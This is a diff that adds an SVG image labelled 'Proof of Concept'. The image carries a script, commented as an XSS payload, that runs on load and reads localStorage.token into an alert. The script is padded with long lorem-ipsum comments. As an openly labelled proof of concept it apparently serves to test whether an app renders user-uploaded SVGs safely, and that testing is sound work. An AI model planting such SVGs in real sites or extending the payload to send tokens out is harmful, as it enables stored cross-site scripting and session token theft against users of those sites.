@@ -1,0 +1,46 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" viewBox="0 0 200 200">
+    <!-- Visual SVG -->
+    <rect width="200" height="200" fill="#3498db" />
+
+    <!-- Text in the center -->
+    <text x="50%" y="50%" font-size="20" text-anchor="middle" dy=".3em" fill="white">Proof of Concept</text>
+
+    <!-- XSS Payload: Execute alert on load -->
+    <script type="text/javascript">
+        function exploit() {
+    var result = alert(localStorage.token);
+}
+
+exploit()
+
+// 
+
+//Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed faucibus massa vel vehicula pellentesque. Phasellus placerat euismod nisi, sollicitudin sodales ex fermentum sit amet. Pellentesque iaculis sagittis felis. Donec in quam nisl. Vestibulum venenatis orci vel accumsan pharetra. Integer eget eros ullamcorper mi porttitor dignissim. Donec ut sem ac lorem convallis pulvinar id hendrerit libero. Praesent sed eleifend augue. Morbi ut nulla suscipit, volutpat augue vitae, tempus quam. Proin semper, nunc eget egestas tempor, tellus purus viverra odio, sed lobortis mauris mauris at augue. In ac eleifend velit, a dignissim odio. Cras bibendum ultricies est quis eleifend. Sed auctor vulputate sem, non egestas mi semper vel. Sed ut iaculis leo, ac porta nibh. Nulla sit amet justo eget arcu rhoncus ultricies. Etiam nec sem congue felis dictum egestas.
+
+//Maecenas dapibus dolor et eros auctor consectetur. Nunc faucibus ultricies risus, ut sodales leo sollicitudin eu. Suspendisse potenti. Ut malesuada tortor eu arcu mattis maximus. Mauris lobortis facilisis metus, nec congue metus vehicula malesuada. Donec condimentum condimentum porta. Etiam laoreet vitae felis eu laoreet.
+
+//Aenean ante arcu, maximus eget massa sed, suscipit congue turpis. Etiam malesuada magna euismod mauris posuere consectetur nec ut sapien. Donec at massa sed lorem commodo congue ut ac nulla. Aenean dapibus quam ex, mollis tempus mi semper ut. Sed felis massa, semper ut tincidunt et, venenatis vel metus. Praesent facilisis odio lectus, sed fermentum mi laoreet non. Sed luctus elit sed iaculis venenatis. Ut posuere, nulla a auctor posuere, purus dolor aliquet massa, a blandit urna mauris at tortor. Mauris vel magna sagittis tortor aliquam aliquam. Integer a tortor blandit, semper purus non, mattis lorem. Curabitur fermentum sollicitudin felis, in sagittis nulla pellentesque et.
+
+//Nam in orci et augue posuere tempus. Maecenas ac pulvinar nulla. Donec rutrum scelerisque viverra. Duis leo justo, rhoncus a sem euismod, molestie lobortis arcu. Fusce lobortis quis est id sollicitudin. Vivamus nec enim sed nisi semper porta in in elit. Maecenas fermentum nibh eu velit rhoncus viverra.
+
+//Nullam id libero eget eros elementum viverra venenatis at risus. Aliquam volutpat vel mi sed bibendum. Duis ultrices vulputate nisl. Nunc hendrerit vel nibh in venenatis. Integer semper nunc nec lacus sollicitudin varius. Etiam nec accumsan elit, sed hendrerit nunc. Maecenas et iaculis leo. Aliquam a dapibus diam. Curabitur sollicitudin imperdiet leo eget tempor. Sed mollis venenatis lorem non laoreet.
+
+//Vestibulum quis magna ut turpis aliquam elementum. Vivamus tempus facilisis tincidunt. Morbi hendrerit augue in mi volutpat, et tempus mi iaculis. Curabitur porta sit amet lorem commodo accumsan. In imperdiet elementum augue, sed bibendum lacus pellentesque vitae. Duis molestie vitae ex sit amet euismod. Nullam luctus tempus pulvinar. Aliquam ornare dolor nisi, vel aliquam felis elementum id. Pellentesque arcu elit, maximus sed tellus sit amet, posuere fermentum sapien. Nam sagittis, ex pharetra dictum auctor, leo tortor maximus felis, vel porttitor elit nisi nec felis. Nullam id est ligula. Sed tempor accumsan iaculis. In hac habitasse platea dictumst.
+
+//Vivamus placerat pulvinar lacus, eget mattis diam fringilla in. Suspendisse condimentum malesuada eros vel tempus. Curabitur velit nibh, aliquam nec orci eu, sodales efficitur nisl. Vestibulum cursus lorem nec ipsum ornare, ut iaculis arcu pharetra. Etiam eget egestas dolor. Morbi pretium ullamcorper ipsum non luctus. Curabitur neque quam, maximus id lobortis lacinia, congue eget ligula. Donec libero erat, vulputate eget enim ac, pulvinar lacinia libero. Nam porttitor ipsum eu volutpat suscipit.
+
+//Duis neque nisl, volutpat sit amet ultrices vitae, accumsan vel elit. Fusce ullamcorper feugiat nibh, ac pulvinar diam scelerisque vitae. Quisque consequat turpis id nisi mollis convallis. Vestibulum facilisis magna ac dictum ullamcorper. Mauris lacinia viverra tortor, a posuere elit bibendum tristique. Vivamus ac libero magna. Nunc aliquet ut massa id accumsan. Vivamus at sapien iaculis, posuere sem ut, facilisis orci. Donec sed hendrerit ipsum, id auctor est. Aenean auctor, metus eget pulvinar varius, nibh lacus vulputate metus, quis venenatis quam nulla sit amet enim. Curabitur sagittis mi eros, eget finibus dolor luctus eu. Fusce at ultrices lacus. Donec at commodo purus. Ut iaculis sagittis ligula, ut luctus magna.
+
+//Pellentesque sit amet sollicitudin lorem, sit amet malesuada purus. Pellentesque aliquet lectus libero, at tincidunt lorem aliquam at. Donec nulla risus, euismod mattis rutrum sed, dignissim vitae felis. Phasellus iaculis blandit nisl molestie lacinia. Ut efficitur orci non velit porttitor, nec gravida tortor convallis. Proin sodales, libero ut maximus malesuada, nisl nunc scelerisque arcu, at malesuada est purus ac odio. In aliquam est non tellus commodo sodales.
+
+//Fusce id magna finibus, porttitor enim ac, malesuada velit. Maecenas tristique diam ut nibh molestie, nec consequat nisi fringilla. Praesent semper erat placerat, mollis metus sit amet, gravida diam. Praesent at varius lectus, vel fermentum sapien. Vestibulum commodo porta odio ac auctor. Sed metus urna, feugiat eu neque non, laoreet mollis justo. Aliquam justo eros, ultricies nec sapien in, elementum iaculis orci. Sed finibus ornare nunc at sodales. Praesent orci turpis, pulvinar ut sodales vitae, condimentum hendrerit massa. Nam sed lacinia orci. Mauris tortor ipsum, rutrum id nisl ut, feugiat malesuada mauris.
+
+//Nulla pellentesque a nulla sit amet interdum. Etiam lobortis porttitor semper. Praesent quis tristique eros. Nam quis maximus massa, et consectetur mauris. Aliquam cursus, lacus vel cursus consequat, massa magna sodales erat, sed scelerisque mi eros a risus. Aliquam erat volutpat. In dignissim nisi metus, eget varius leo placerat a. Duis vehicula nulla ac lacus vulputate laoreet. In a ante libero. Morbi ornare fermentum pulvinar. Donec finibus convallis eros, pellentesque pulvinar sem semper quis. Ut tincidunt libero eget magna sodales, at condimentum tellus cursus. Phasellus vestibulum lacinia ullamcorper. Curabitur dictum accumsan felis, eu vehicula magna pretium eget.
+
+//Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia curae; Pellentesque ornare velit sed lectus mattis, ac vehicula est congue. Fusce dignissim lacinia ultrices. Pellentesque volutpat a nisl vel posuere. Integer vel iaculis nunc. Donec vitae ipsum at leo mattis aliquet a sed velit. Nullam a pretium purus, consequat vulputate enim.
+
+//Nulla facilisi. Donec auctor lorem nec leo facilisis cursus. Sed mattis cursus turpis, blandit viverra erat aliquam eu. Donec aliquam ipsum nec nisl fermentum pharetra. Fusce porttitor massa. 
+
+    </script>
+</svg>
+
